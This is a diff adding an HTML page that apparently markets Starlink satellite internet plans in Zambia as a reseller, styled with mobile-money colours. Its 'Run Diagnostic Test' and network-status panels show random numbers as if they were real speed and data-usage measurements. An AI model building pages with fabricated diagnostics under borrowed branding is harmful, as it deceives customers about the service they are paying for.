@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Starlink Zambia - High-Speed Satellite Internet</title>
+    <link rel="icon" type="image/png" href="https://www.starlink.com/favicon.ico">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        :root {
+            --momo-yellow: #FFCC00;
+            --momo-dark: #333333;
+        }
+        .starlink-black {
+            background-color: #000000;
+        }
+        .momo-yellow-bg {
+            background-color: var(--momo-yellow);
+        }
+        .momo-gradient {
+            background: linear-gradient(135deg, var(--momo-yellow) 0%, #FFD633 100%);
+        }
+        .card-shadow {
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        .package-card {
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            cursor: pointer;
+        }
+        .package-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 8px 12px rgba(0, 0, 0, 0.15);
+        }
+        .package-card.selected {
+            border: 2px solid #000;
+            background-color: #f8fafc;
+        }
+        body {
+            padding-top: 72px;
+            padding-bottom: 72px;
+        }
+    </style>
+</head>
+<body class="bg-gray-50">
+    <!-- Fixed Header -->
+    <header class="bg-black text-white shadow-sm fixed top-0 left-0 right-0 z-50">
+        <div class="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
+            <a href="/" class="flex items-center gap-2">
+                <img src="https://ug-starlinknetwork.up.railway.app/static/images/starlink_logo_new.png" alt="STARLINK" class="h-14 sm:h-16">
+                <span class="text-sm border-l pl-2 ml-2 border-gray-600 hidden sm:inline">Zambia Reseller</span>
+            </a>
+            <nav class="hidden md:flex gap-6">
+                <a href="/plans/" class="text-gray-300 hover:text-white flex items-center gap-2">
+                    <i class="uil uil-wifi"></i> <span>Status</span>
+                </a>
+                <a href="/plans/" class="text-gray-300 hover:text-white flex items-center gap-2">
+                    <i class="uil uil-home"></i> <span>Plans</span>
+                </a>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="max-w-7xl mx-auto px-4 py-8">
+        
+        <div class="space-y-6">
+            
+            <div class="relative overflow-hidden bg-white rounded-3xl p-1 card-shadow">
+                <button onclick="window.location.href='/plans/'" 
+                        class="w-full bg-gradient-to-r from-blue-600 via-blue-700 to-blue-800 hover:from-blue-700 hover:to-blue-900 text-white font-black py-5 rounded-2xl transition-all transform active:scale-95 flex items-center justify-center gap-3 shadow-xl animate-pulse">
+                    <i class="uil uil-shopping-bag text-2xl"></i>
+                    <span class="text-lg uppercase tracking-wider">Choose Your Package</span>
+                </button>
+            </div>
+
+            <div class="bg-gradient-to-br from-gray-800 to-black text-white p-6 sm:p-8 rounded-3xl card-shadow">
+                <div class="flex items-center justify-between mb-4">
+                    <div>
+                        <p class="text-blue-400 text-xs sm:text-sm font-semibold uppercase tracking-widest">Service Information</p>
+                        <h1 class="text-2xl sm:text-3xl font-black mt-2">Starlink Zambia</h1>
+                    </div>
+                </div>
+                <p class="text-gray-400 text-sm">Select a plan to activate high-speed satellite internet in Zambia.</p>
+            </div>
+
+            <!-- Network Stats (demo) -->
+            <div class="grid grid-cols-2 gap-3 sm:gap-4">
+                <div class="bg-white rounded-2xl p-4 sm:p-6 card-shadow border border-gray-100">
+                    <div class="flex items-center justify-between mb-3">
+                        <p class="text-gray-600 text-xs font-bold uppercase tracking-widest">Download</p>
+                        <i class="uil uil-arrow-down text-blue-600 text-lg sm:text-xl"></i>
+                    </div>
+                    <p class="text-2xl sm:text-3xl font-black text-gray-900" id="download-speed">--</p>
+                    <p class="text-gray-500 text-xs mt-1">Mbps</p>
+                </div>
+
+                <div class="bg-white rounded-2xl p-4 sm:p-6 card-shadow border border-gray-100">
+                    <div class="flex items-center justify-between mb-3">
+                        <p class="text-gray-600 text-xs font-bold uppercase tracking-widest">Upload</p>
+                        <i class="uil uil-arrow-up text-green-600 text-lg sm:text-xl"></i>
+                    </div>
+                    <p class="text-2xl sm:text-3xl font-black text-gray-900" id="upload-speed">--</p>
+                    <p class="text-gray-500 text-xs mt-1">Mbps</p>
+                </div>
+
+                <div class="bg-white rounded-2xl p-4 sm:p-6 card-shadow border border-gray-100">
+                    <div class="flex items-center justify-between mb-3">
+                        <p class="text-gray-600 text-xs font-bold uppercase tracking-widest">Ping</p>
+                        <i class="uil uil-pulse text-orange-600 text-lg sm:text-xl"></i>
+                    </div>
+                    <p class="text-2xl sm:text-3xl font-black text-gray-900" id="ping">--</p>
+                    <p class="text-gray-500 text-xs mt-1">ms</p>
+                </div>
+
+                <div class="bg-white rounded-2xl p-4 sm:p-6 card-shadow border border-gray-100">
+                    <div class="flex items-center justify-between mb-3">
+                        <p class="text-gray-600 text-xs font-bold uppercase tracking-widest">Jitter</p>
+                        <i class="uil uil-wave text-purple-600 text-lg sm:text-xl"></i>
+                    </div>
+                    <p class="text-2xl sm:text-3xl font-black text-gray-900" id="jitter">--</p>
+                    <p class="text-gray-500 text-xs mt-1">ms</p>
+                </div>
+            </div>
+
+            <!-- Data Usage (demo) -->
+            <div class="bg-white rounded-2xl p-6 sm:p-8 card-shadow border border-gray-100">
+                <div class="flex items-center justify-between mb-4">
+                    <div class="flex items-center gap-2">
+                        <i class="uil uil-database text-blue-600 text-2xl"></i>
+                        <h3 class="text-lg font-bold text-gray-900">Data Usage</h3>
+                    </div>
+                    <span class="text-xs font-semibold text-gray-600 bg-gray-100 px-3 py-1 rounded-full" id="data-percentage">0%</span>
+                </div>
+                
+                <div class="w-full bg-gray-200 rounded-full h-3 mb-3 overflow-hidden">
+                    <div class="bg-gradient-to-r from-blue-500 to-blue-600 h-full rounded-full transition-all duration-500" id="data-progress" style="width: 0%"></div>
+                </div>
+                
+                <div class="flex justify-between text-xs text-gray-600">
+                    <span id="data-used">0 GB</span>
+                    <span id="data-limit">100 GB</span>
+                </div>
+            </div>
+
+            <div class="grid grid-cols-1 gap-3">
+                <button onclick="runSpeedTest()" class="w-full bg-white border border-gray-200 text-gray-900 font-bold py-3 rounded-xl transition transform active:scale-95 flex items-center justify-center gap-2 card-shadow">
+                    <i class="uil uil-bolt text-blue-600"></i> Run Diagnostic Test
+                </button>
+            </div>
+        </div>
+
+        <script>
+            function generateNetworkStats() {
+                return {
+                    download: (Math.random() * 100 + 100).toFixed(2),
+                    upload: (Math.random() * 20 + 20).toFixed(2),
+                    ping: Math.floor(Math.random() * 40 + 20),
+                    jitter: Math.floor(Math.random() * 8 + 2),
+                    dataUsed: (Math.random() * 30 + 20).toFixed(1),
+                    dataLimit: 100
+                };
+            }
+
+            function updateNetworkStats() {
+                const stats = generateNetworkStats();
+                document.getElementById('download-speed').textContent = stats.download;
+                document.getElementById('upload-speed').textContent = stats.upload;
+                document.getElementById('ping').textContent = stats.ping;
+                document.getElementById('jitter').textContent = stats.jitter;
+                document.getElementById('data-used').textContent = stats.dataUsed + ' GB';
+                document.getElementById('data-limit').textContent = stats.dataLimit + ' GB';
+                
+                const percentage = (stats.dataUsed / stats.dataLimit * 100).toFixed(0);
+                document.getElementById('data-percentage').textContent = percentage + '%';
+                document.getElementById('data-progress').style.width = percentage + '%';
+            }
+
+            function runSpeedTest() {
+                const button = event.target.closest('button');
+                const originalText = button.innerHTML;
+                button.innerHTML = '<i class="uil uil-spinner-alt animate-spin"></i> Analyzing...';
+                button.disabled = true;
+                
+                setTimeout(() => {
+                    updateNetworkStats();
+                    button.innerHTML = originalText;
+                    button.disabled = false;
+                }, 2500);
+            }
+
+            document.addEventListener('DOMContentLoaded', updateNetworkStats);
+        </script>
+
+    </main>
+
+    <!-- Fixed Bottom Navigation -->
+    <nav class="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 shadow-2xl z-50">
+        <div class="max-w-7xl mx-auto px-2 sm:px-4 py-2 sm:py-3 flex justify-around items-center">
+            <a href="/plans/" class="flex flex-col items-center gap-1 text-blue-600 transition-all">
+                <i class="uil uil-wifi text-2xl"></i>
+                <span class="text-xs font-semibold">Status</span>
+            </a>
+            
+            <a href="/plans/" class="flex flex-col items-center gap-1 text-gray-600 hover:text-blue-600 transition-all">
+                <i class="uil uil-shopping-bag text-2xl"></i>
+                <span class="text-xs font-semibold">Plans</span>
+            </a>
+            
+            <a href="/settings/" class="flex flex-col items-center gap-1 text-gray-600 hover:text-blue-600 transition-all">
+                <i class="uil uil-setting text-2xl"></i>
+                <span class="text-xs font-semibold">Settings</span>
+            </a>
+        </div>
+    </nav>
+</body>
+</html>
